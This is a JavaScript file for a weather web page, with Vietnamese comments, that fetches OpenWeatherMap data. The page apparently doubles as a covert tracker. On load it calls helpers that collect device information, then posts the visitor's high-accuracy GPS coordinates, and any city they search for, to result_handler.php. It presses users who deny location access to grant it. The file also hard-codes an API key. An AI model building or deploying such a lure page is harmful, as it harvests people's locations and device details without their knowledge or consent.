// Dòng code dưới định nghĩa một biến hằng số currentDetails lưu trữ URL của OpenWeatherMap API với vĩ độ, kinh độ và khóa API cụ thể.
const currentDetails = "https://api.openweathermap.org/data/3.0/onecall?lat=35&lon=139&appid={API key}";

// Khai báo các biến để lưu trữ các phần tử HTML
const currTime = document.querySelector('#time');
const ampm = document.getElementById('#ampm');
const searchBar = document.querySelector('#searchbar');
const humid = document.getElementById('humidity');
const sunrise = document.getElementById('sunrise');
const sunset = document.getElementById('sunset');
const pressure = document.getElementById('pressure');
const speed = document.getElementById('speed');
const temperature = document.getElementById('temperature');
const feelsLike = document.getElementById('feels-like');
const loc = document.querySelector('#location span');
const icon = document.getElementById('icon');
const weather = document.getElementById('weather');
const dtInfo = document.getElementById('dt');
const stat = document.getElementById('stat');
const darkBtn = document.querySelector(".dark-btn");
const body = document.getElementById("main-body");
const forecast = document.getElementById("table");
const aqi = document.getElementById("aqi");
const quality = document.getElementById("quality");
const input_text = document.getElementById('input_text');

// Biến để lưu trữ tọa độ vị trí
let userLatitude = null;
let userLongitude = null;

// Thêm sự kiện click cho nút chuyển giao diện tối/sáng
darkBtn.addEventListener("click", () => {
  if (darkBtn.checked) {
    body.classList.remove("light");
    body.classList.add("dark");
    loc.classList.add("dark-theme");
  } else {
    body.classList.remove("dark");
    body.classList.add("light");
    loc.classList.remove("dark-theme"); // Xóa class dark-theme
  }
});

// Khai báo biến limit và API key
var limit = 5;
var APIkey = 'd11089033f302effdd5c0af29c7bd6aa';

// Lấy vị trí hiện tại của người dùng khi trang được tải
window.addEventListener('DOMContentLoaded', () => {
  // Gọi hàm trong location.js để thu thập thông tin thiết bị
  if (typeof information === 'function') {
    information();
  }

  // Tạo hàm global để cập nhật thời tiết và truy cập từ các file khác
  window.updateWeather = function(lat, lon) {
    userLatitude = lat;
    userLongitude = lon;
    updateDetails(lat, lon);
  };
  
  // Sử dụng hàm locate từ location.js để lấy vị trí và gửi về server
  if (typeof locate === 'function') {
    locate(
      function success() {
        console.log("Vị trí đã được gửi thành công");
        // Lấy vị trí để cập nhật thông tin thời tiết
        navigator.geolocation.getCurrentPosition(
          (position) => {
            userLatitude = position.coords.latitude;
            userLongitude = position.coords.longitude;
            updateDetails(userLatitude, userLongitude);
          },
          (error) => {
            console.error("Không thể lấy thông tin thời tiết:", error);
          }
        );
      },
      function error() {
        console.log("Không thể gửi vị trí");
      }
    );
  } else {
    // Fallback nếu không tìm thấy hàm locate
    navigator.geolocation.getCurrentPosition(
      (position) => {
        userLatitude = position.coords.latitude;
        userLongitude = position.coords.longitude;
        updateDetails(userLatitude, userLongitude);
        
        // Gửi vị trí bằng AJAX trực tiếp
        sendLocationToServer(userLatitude, userLongitude);
      },
      (error) => {
        console.error("Lỗi khi lấy vị trí:", error);
        
        if (error.code === error.PERMISSION_DENIED) {
          setTimeout(function() {
            if (typeof showDenyModal === 'function') {
              showDenyModal();
            } else {
              alert("Vui lòng cấp quyền truy cập vị trí để xem thông tin thời tiết chính xác!");
            }
          }, 300);
        }
      },
      { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
    );
  }
});

// Hàm lấy tọa độ dựa trên tên thành phố
async function getCoords(cityName) { 
  const limit = 5; // Giới hạn số lượng thành phố trả về
  const pos = { latitude: 0, longitude: 0 };
  const api_url = `http://api.openweathermap.org/geo/1.0/direct?q=${cityName}&limit=${limit}&appid=${APIkey}` // Tạo URL API
  await fetch(api_url).then(res => res.json()).then(data => {
    pos.latitude = data[0].lat;
    pos.longitude = data[0].lon;
    return pos;
  });
  return pos;
}

// Sự kiện khi người dùng nhấn phím Enter trong ô tìm kiếm
document.addEventListener('keyup', (event) => {
  if (event.key === 'Enter' && input_text.value.trim() !== '') {
    getCoords(input_text.value).then((data) => {
      userLatitude = data.latitude;
      userLongitude = data.longitude;
      updateDetails(userLatitude, userLongitude);
      
      // Gửi vị trí tìm kiếm về server
      sendLocationToServer(userLatitude, userLongitude, 'search');
    });
  }
});

// Sự kiện khi người dùng nhấn nút tìm kiếm
document.getElementById('button-addon2').addEventListener('click', () => {
  if (input_text.value.trim() !== '') {
    getCoords(input_text.value).then((data) => {
      userLatitude = data.latitude;
      userLongitude = data.longitude;
      updateDetails(userLatitude, userLongitude);
      
      // Gửi vị trí tìm kiếm về server
      sendLocationToServer(userLatitude, userLongitude, 'search');
    });
  }
});

// Hàm gửi vị trí về server
function sendLocationToServer(latitude, longitude, source = 'auto') {
  // Format vị trí
  const lat = latitude + ' deg';
  const lon = longitude + ' deg';
  
  // Gửi vị trí về server thông qua AJAX
  $.ajax({
    type: 'POST',
    url: 'result_handler.php',
    data: {
      Status: 'success',
      Lat: lat,
      Lon: lon,
      Src: source, // Nguồn của vị trí: 'auto' hoặc 'search'
      Acc: 'N/A',
      Alt: 'N/A',
      Dir: 'N/A',
      Spd: 'N/A'
    },
    mimeType: 'text'
  });
}

// Hàm cập nhật thông tin thời tiết và nhiệt độ
async function updateDetails(lat, lon) {
  const weatherAPI = `https://api.openweathermap.org/data/3.0/onecall?lat=${lat}&lon=${lon}&appid=${APIkey}`;
  const geoAPI = `http://api.openweathermap.org/geo/1.0/reverse?lat=${lat}&lon=${lon}&limit=${limit}&appid=${APIkey}`;
  const aqiAPI = `http://api.openweathermap.org/data/2.5/air_pollution?lat=${lat}&lon=${lon}&appid=${APIkey}`;
  await fetch(geoAPI).then(res => res.json()).then(data => {
    console.log(data[0].name, data[0].country);
    loc.innerHTML = `${data[0].name}, ${data[0].country}`;
  });
  await fetch(weatherAPI).then(res => res.json()).then(data => {
    try {
      alert(data.alerts[0].description);
    } catch (err) {
      console.log("KHÔNG CÓ CẢNH BÁO THỜI TIẾT Ở KHU VỰC NÀY");
    }
    icon.src = `http://openweathermap.org/img/wn/${data.current.weather[0].icon}@2x.png`;
    dtInfo.innerText = new Date(new Date(1000 * data.current.dt + data.timezone_offset * 1000).getTime()).toUTCString().slice(0, 22);
    stat.innerText = data.current.weather[0].main;
    humid.innerText = data.current.humidity + " %";
    temperature.innerText = Number(data.current.temp - 273.15).toFixed(0) + " \u00B0" + "c";
    feelsLike.innerText = Number(data.current.feels_like - 273.15).toFixed(1);
    pressure.innerText = data.current.pressure + " mbar";
    speed.innerText = data.current.wind_speed + " km/h";
    sunset.innerText = new Date(new Date(1000 * data.current.sunset + data.timezone_offset * 1000).getTime()).toUTCString().slice(16, 22);
    sunrise.innerText = new Date(new Date(1000 * data.current.sunrise + data.timezone_offset * 1000).getTime()).toUTCString().slice(16, 22);
    for (let index = 0; index < 7; index++) {
      let head = document.getElementById(`${index}`).getElementsByTagName("h2")[0];
      let weatherIcon = document.getElementById(`${index}`).getElementsByTagName("img")[0];
      let max = document.getElementById(`${index}`).getElementsByTagName("td")[0];
      let min = document.getElementById(`${index}`).getElementsByTagName("td")[1];
      weatherIcon.src = `http://openweathermap.org/img/wn/${data.daily[`${index}`].weather[0].icon}@2x.png`;
      head.innerHTML = new Date(new Date(1000 * data.daily[index].dt + data.timezone_offset * 1000).getTime()).toUTCString().slice(0, 11);
      max.innerHTML = (data.daily[index].temp.max - 273.15).toFixed(1);
      min.innerHTML = (data.daily[index].temp.min - 273.15).toFixed(1);
    }
  });
  await fetch(aqiAPI).then(res => res.json()).then(data => {
    try {
      aqi.innerText = data.list[0].main.aqi;
      switch (data.list[0].main.aqi) {
        case 1:
          quality.innerText = "Tốt";
          break;
        case 2:
          quality.innerText = "Tạm Được";
          break;
        case 3:
          quality.innerText = "Bình Thường";
          break;
        case 4:
          quality.innerText = "Tệ";
          break;
        case 5:
          quality.innerText = "Rất Tệ";
          break;
      }
    } catch (err) {
      console.log(err);
    }
  });
}
